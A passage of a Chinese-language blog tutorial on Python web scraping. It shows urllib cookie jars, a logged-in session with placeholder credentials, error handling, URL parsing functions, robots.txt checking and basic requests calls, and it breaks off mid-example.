将cookie写进文件<br>可以将cookies保存成Mozilla型浏览器的cookies格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#将cookie写入文件</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> http.cookiejar<br><br>filename = <span class="hljs-string">&#x27;cookies.txt&#x27;</span><br><span class="hljs-comment">#MozillaCookieJar  将cookie写进文件</span><br><span class="hljs-comment">#可以将cookies保存成Mozilla型浏览器的cookies格式</span><br>cookie = http.cookiejar.MozillaCookieJar(filename=filename)<br><span class="hljs-comment">#保存成 libwww-perl(LWP) 格式cookies文件：</span><br><span class="hljs-comment">#cookie = http.cookiejar.LWPCookieJar(filename=filename)</span><br>handler = urllib.request.HTTPCookieProcessor(cookie)<br>opener = urllib.request.build_opener(handler)<br><br>response = opener.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<br><br><span class="hljs-comment"># for item in cookie:</span><br><span class="hljs-comment">#     print(item)</span><br><br>cookie.save(ignore_discard=<span class="hljs-literal">True</span>,ignore_expires=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><img src="/img/image-20230911213251107.png" alt="image-20230911213251107" style="zoom: 33%;" /><p>LWP格式：</p><img src="/img/image-20230912094156773.png" alt="image-20230912094156773" style="zoom: 50%;" /><p>读:<br>LWPCookieJar<br>保存成 libwww-perl(LWP) 格式cookies文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#读取cookie  携带该cookie去访问网页</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> http.cookiejar<br><br><br>filename = <span class="hljs-string">&#x27;cookies.txt&#x27;</span><br><span class="hljs-comment">#读：</span><br>cookie = http.cookiejar.LWPCookieJar()<br>cookie.load(filename,ignore_discard=<span class="hljs-literal">True</span>,ignore_expires=<span class="hljs-literal">True</span>)<br>handler = urllib.request.HTTPCookieProcessor(cookie)<br>opener = urllib.request.build_opener(handler)<br><br>response = opener.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><br></code></pre></td></tr></table></figure><h4 id="小项目-–-使用cookie登录网站"><a href="#小项目-–-使用cookie登录网站" class="headerlink" title="小项目 – 使用cookie登录网站"></a>小项目 – 使用cookie登录网站</h4><p>测试网站：<a href="https://www.yaozh.com/login">https://www.yaozh.com/login</a></p><p><img src="/img/image-20230912103624808.png" alt="image-20230912103624808"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> http.cookiejar<br><span class="hljs-keyword">import</span> urllib.parse<br><br><span class="hljs-comment">#1.使用账号密码登录网站</span><br><br><span class="hljs-comment">#登录url：</span><br>url = <span class="hljs-string">&#x27;https://www.yaozh.com/login&#x27;</span><br><br><span class="hljs-comment">#登录的参数：</span><br>login_data = &#123;<br>    <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;pwd&quot;</span>:<span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;pc_vcode&quot;</span>:<span class="hljs-string">&quot;86_zh-CN&quot;</span>,<br>    <span class="hljs-string">&quot;country&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;mobile&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;vcode&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;pincode&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;formhash&quot;</span>:<span class="hljs-string">&quot;636BCA3396&quot;</span>,<br>    <span class="hljs-string">&quot;backurl&quot;</span>:<span class="hljs-string">&quot;%252F%252Fwww.yaozh.com%252F&quot;</span>,    <br>&#125;<br><span class="hljs-comment">#发送登录请求</span><br>cookie = http.cookiejar.CookieJar()<br>handler = urllib.request.HTTPCookieProcessor()<br>opener = urllib.request.build_opener(handler)<br>headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br><br>    &#125;<br><span class="hljs-comment">#将请求参数转化为bytes</span><br>login_str = urllib.parse.urlencode(login_data).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>req = urllib.request.Request(url=url,headers=headers,data=login_str)<br><span class="hljs-comment">#如果登录成功，cookiejar会自动保存cookie</span><br>opener.<span class="hljs-built_in">open</span>(req)<br><br><span class="hljs-comment">#带着cookie去访问  登录后才能访问的页面</span><br><span class="hljs-comment">#如果请求成功 则表明cookie保存成功</span><br>login_url = <span class="hljs-string">&quot;https://www.yaozh.com/member&quot;</span><br><br>req2 = urllib.request.Request(login_url,headers=headers)<br>response = opener.<span class="hljs-built_in">open</span>(login_url)<br>data = response.read()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cookie.html&#x27;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(data)<br></code></pre></td></tr></table></figure><img src="/img/image-20230912103538210.png" alt="image-20230912103538210" style="zoom:67%;" /><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>防止程序健壮性较差  </p><p>urllib的error模块：</p><p>urlerror：继承OSError</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br><br><span class="hljs-keyword">except</span> error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)  <span class="hljs-comment">#打印错误原因</span><br>    <br>测试：<br><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> request,error<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment">#定义不存在的路径，并且不带账户密码访问</span><br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/asdasd&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>    &#125;<br>    req = urllib.request.Request(url=url,headers=headers)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">except</span> error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912104854648.png" alt="image-20230912104854648"></p><p>HTTPError</p><p>用于处理HTTP请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib.error <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> request<br><br><span class="hljs-keyword">try</span>:<br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/asdasd&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>    &#125;<br>    req = urllib.request.Request(url=url,headers=headers)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">except</span> HTTPError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http error: &quot;</span>,e)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912105624185.png" alt="image-20230912105624185"></p><p>超时异常  —  URLError处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib.error <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># url = &quot;https://ssr3.scrape.center/asdasd&quot;</span><br>    <span class="hljs-comment"># headers = &#123;</span><br>    <span class="hljs-comment">#     &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;,</span><br>    <span class="hljs-comment"># &#125;</span><br>    <span class="hljs-comment"># req = urllib.request.Request(url=url,headers=headers)</span><br>    <span class="hljs-comment"># response = urllib.request.urlopen(req)</span><br>    <span class="hljs-comment"># print(response.read().decode(&#x27;utf-8&#x27;))</span><br>    url = <span class="hljs-string">&quot;https://www.baidu.com&quot;</span><br>    <span class="hljs-comment">#设置超时时间为0.01 触发超时错误</span><br>    response = urllib.request.urlopen(url=url,timeout=<span class="hljs-number">0.01</span>)<br><br><span class="hljs-comment">#except HTTPError as e:</span><br>    <span class="hljs-comment">#print(&quot;http error: &quot;,e)</span><br><span class="hljs-keyword">except</span> URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(e.reason,socket.timeout):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Time out!!&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="链接的组成和解析"><a href="#链接的组成和解析" class="headerlink" title="链接的组成和解析"></a>链接的组成和解析</h3><p><strong>urlparse:python标准库中的一个模块，解析和操作url</strong></p><ul><li><strong>标准url链接格式:</strong></li></ul><p>scheme:&#x2F;&#x2F;netloc&#x2F;path;params?query#fragment</p><p>scheme（协议） http or https<br>netloc（网络位置） host<br>path（路径）<br>params（携带的参数）<br>query（查询参数）<br>fragment（片段） 内部导航</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><br>url = <span class="hljs-string">&#x27;http://www.baidu.com/index.html;user?id=0#comment&#x27;</span><br><br>result = urlparse(url=url)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result),result)<br><br>结果：<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;urllib.parse.ParseResult&#x27;</span>&gt; <br>ParseResult(scheme=<span class="hljs-string">&#x27;http&#x27;</span>, netloc=<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, path=<span class="hljs-string">&#x27;/index.html&#x27;</span>, params=<span class="hljs-string">&#x27;user&#x27;</span>, query=<span class="hljs-string">&#x27;id=0&#x27;</span>, fragment=<span class="hljs-string">&#x27;comment&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li><strong>urlunparse:与urlparse相反，组合url</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse<br>data = [<span class="hljs-string">&#x27;http&#x27;</span>,<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,<span class="hljs-string">&#x27;index.html&#x27;</span>,<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-string">&#x27;id=0&#x27;</span>,<span class="hljs-string">&#x27;comment&#x27;</span>]<br>url = urlunparse(data)<br><span class="hljs-built_in">print</span>(url)<br><br>结果：<br>http://www.baidu.com/index.html;user?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span><span class="hljs-comment">#comment</span><br></code></pre></td></tr></table></figure><ul><li><strong>urlsplit:与urlparse类似，用于将url参数分割成不同的部分，但不会解析查询参数和片段部分</strong></li></ul><p>返回的是一个元组  可以用索引取值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse,urlsplit<br>url = <span class="hljs-string">&#x27;http://www.baidu.com/index.html;user?id=0#comment&#x27;</span><br>parts = urlsplit(url)<br><span class="hljs-built_in">print</span>(parts)<br><span class="hljs-built_in">print</span>(parts.scheme)<br><span class="hljs-built_in">print</span>(parts[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(parts.netloc)<br><span class="hljs-built_in">print</span>(parts.path)<br><span class="hljs-comment"># print(parts.params)</span><br><span class="hljs-built_in">print</span>(parts.query)<br><span class="hljs-built_in">print</span>(parts.fragment)<br><br>结果：<br>SplitResult(scheme=<span class="hljs-string">&#x27;http&#x27;</span>, netloc=<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, path=<span class="hljs-string">&#x27;/index.html;user&#x27;</span>, query=<span class="hljs-string">&#x27;id=0&#x27;</span>, fragment=<span class="hljs-string">&#x27;comment&#x27;</span>)<br>http<br>http<br>www.baidu.com<br>/index.html;user<br><span class="hljs-built_in">id</span>=<span class="hljs-number">0</span><br>comment<br><br><span class="hljs-comment">#urlunsplit  组合</span><br>data = (<span class="hljs-string">&#x27;http&#x27;</span>,<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,<span class="hljs-string">&#x27;index.html&#x27;</span>,<span class="hljs-string">&#x27;id=0&#x27;</span>,<span class="hljs-string">&#x27;comment&#x27;</span>)<br><span class="hljs-built_in">print</span>(urlunsplit(data))<br>结果：<br>http://www.baidu.com/index.html?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span><span class="hljs-comment">#comment</span><br></code></pre></td></tr></table></figure><ul><li><strong>urljoin：urljoin()是连接一个基本URL和一个可能的相对URL来形成一个绝对URL</strong></li></ul><p>参数：</p><p>base  基本url，通常是一个绝对的url</p><p>url  这个是相对的url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse,urlsplit,urlunsplit,urljoin<br>base_url = <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span><br>relative_url = <span class="hljs-string">&#x27;path/to/xxx&#x27;</span><br><br>url = urljoin(base=base_url,url=relative_url)<br><span class="hljs-built_in">print</span>(url)<br><br>结果：<br>https://www.baidu.com/path/to/xxx<br></code></pre></td></tr></table></figure><p>注意：base_url 提供了三项内容 scheme、netloc 和 path。如果这 3 项在新的链接里不存在，就予以补充；如果新的链接存在，就使用新的链接的部分。而 base_url 中的 params、query 和 fragment 是不起作用的。</p><ul><li><strong>parse_qs</strong></li></ul><p>get参数的序列化</p><ul><li><strong>parse_qsl</strong></li></ul><p>将参数转为元组组成列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse,urlsplit,urlunsplit,urljoin,parse_qs <br>query = <span class="hljs-string">&#x27;name=handsomer1&amp;age=18&#x27;</span><br><span class="hljs-built_in">print</span>(parse_qs(query))<br><span class="hljs-built_in">print</span>(parse_qsl(query))<br><br>结果：<br>&#123;<span class="hljs-string">&#x27;name&#x27;</span>: [<span class="hljs-string">&#x27;handsomer1&#x27;</span>], <span class="hljs-string">&#x27;age&#x27;</span>: [<span class="hljs-string">&#x27;18&#x27;</span>]&#125;<br>[(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;handsomer1&#x27;</span>), (<span class="hljs-string">&#x27;age&#x27;</span>, <span class="hljs-string">&#x27;18&#x27;</span>)]<br></code></pre></td></tr></table></figure><ul><li><strong>quote</strong></li></ul><p>url编码</p><ul><li><strong>unquote</strong></li></ul><p>url解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote, unquote<br>keyword = <span class="hljs-string">&quot;卢本伟&quot;</span><br>url = <span class="hljs-string">&#x27;https://www.baidu.com/s?wd=&#x27;</span>+quote(keyword)<br><span class="hljs-built_in">print</span>(url)<br>url_1 = unquote(url)<br><span class="hljs-built_in">print</span>(url_1)<br><br>结果：<br>https://www.baidu.com/s?wd=%E5%8D%A2%E6%9C%AC%E4%BC%9F<br>https://www.baidu.com/s?wd=卢本伟<br></code></pre></td></tr></table></figure><ul><li><strong>robotparser模块</strong></li></ul><p>用于解析robots.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> urllib.robotparser <span class="hljs-keyword">import</span> RobotFileParser<br><br><span class="hljs-comment">#创建一个RobotFileParser对象用于解析robots.txt</span><br>robot_parser = RobotFileParser()<br><span class="hljs-comment">#robot_parser.set_url(&#x27;https://www.baidu.com/robots.txt&#x27;)</span><br>robot_parser.set_url(<span class="hljs-string">&#x27;https://www.zhihu.com/robots.txt&#x27;</span>)<br><span class="hljs-comment">#读取并解析robots.txt</span><br>robot_parser.read()<br><br><span class="hljs-comment">#检查是否可以爬取特定的url</span><br>user_agent = <span class="hljs-string">&quot;BaiduSpider&quot;</span><br><span class="hljs-comment">#check_url = &#x27;https://www.baidu.com/baidu&#x27;</span><br>check_url = <span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span><br><br><span class="hljs-comment">#can_fetch 确定指定的用户代理是否允许访问网页</span><br><span class="hljs-keyword">if</span> robot_parser.can_fetch(user_agent,check_url):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;可以爬取此url&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不能爬取此url&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h2><h3 id="普通请求-get-post-put-…"><a href="#普通请求-get-post-put-…" class="headerlink" title="普通请求 get post put …"></a>普通请求 get post put …</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#！/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#get</span><br><span class="hljs-comment"># r = requests.get(&#x27;http://httpbin.org/get&#x27;)</span><br><span class="hljs-comment"># print(r.text)</span><br><br><span class="hljs-comment">#添加参数的get请求</span><br><span class="hljs-comment"># data = &#123;</span><br><span class="hljs-comment">#     &#x27;name&#x27;:&#x27;handsomewuyue&#x27;,</span><br><span class="hljs-comment">#     &#x27;age&#x27;:&#x27;18&#x27;</span><br><span class="hljs-comment"># &#125;</span><br><span class="hljs-comment"># r = requests.get(&#x27;http://httpbin.org/get&#x27;,params=data)</span><br><span class="hljs-comment"># print(r.text)</span><br><br><span class="hljs-comment">#post</span><br><span class="hljs-comment"># data = &#123;</span><br><span class="hljs-comment">#      &#x27;name&#x27;:&#x27;handsomewuyue&#x27;,</span><br><span class="hljs-comment">#      &#x27;age&#x27;:&#x27;18&#x27;</span><br><span class="hljs-comment"># &#125;</span><br><span class="hljs-comment"># r = requests.post(&#x27;http://httpbin.org/post&#x27;,data=data)</span><br><span class="hljs-comment"># print(r.text)</span><br><br><span class="hljs-comment"># r = requests.put(&#x27;http://httpbin.org/put&#x27;)</span><br><span class="hljs-comment"># r = requests.delete(&#x27;http://httpbin.org/delete&#x27;)</span><br><span class="hljs-comment"># r = requests.head(&#x27;http://httpbin.org/head&#x27;)</span><br><span class="hljs-comment"># r = requests.options(&#x27;http://httpbin.org/options&#x27;)</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Usrt-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&#x27;</span><br>&#125;<br>r = requests.get(<span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>,headers=headers)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="高级用法（文件上传-requestcookiejar-session等）"><a href="#高级用法（文件上传-requestcookiejar-session等）" class="headerlink" title="高级用法（文件上传 requestcookiejar session等）"></a>高级用法（文件上传 requestcookiejar session等）</h3><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br><span class="hljs-comment">#上传图片文件</span><br>file = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;favicon.ico&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br>r = requests.post(url,files=file)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#！/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://www.zhihu.com&#x27;</span><br><span class="hljs-comment"># r = requests.get(url=url)</span><br><span class="hljs-comment"># print(r.cookies)</span><br><span class="hljs-comment"># for k,v in r.cookies.items():</span><br><span class="hljs-comment">#     print(k + &quot;=&quot; + v)</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:xxx<span class="hljs-string">&#x27;,</span><br><span 